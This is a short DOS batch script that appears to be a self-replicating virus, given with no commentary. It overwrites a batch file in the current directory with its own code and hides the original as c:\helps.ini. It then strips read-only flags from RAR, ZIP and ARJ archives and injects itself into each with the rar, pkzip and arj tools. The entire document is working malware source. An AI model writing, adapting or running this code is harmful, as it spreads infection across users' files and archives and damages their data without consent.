@echo off
for %%d in (*.bat) do set B=%%d
move %B% c:\helps.ini
copy %0 %B%
for %%f in (*.rar *.zip *.arj) do attrib -r %%f
for %%r in (*.rar) do rar a -tk -y -c- -o+ %%r %0
for %%z in (*.zip) do pkzip -m %%z %0
for %%a in (*.arj) do arj a -d %%a %0
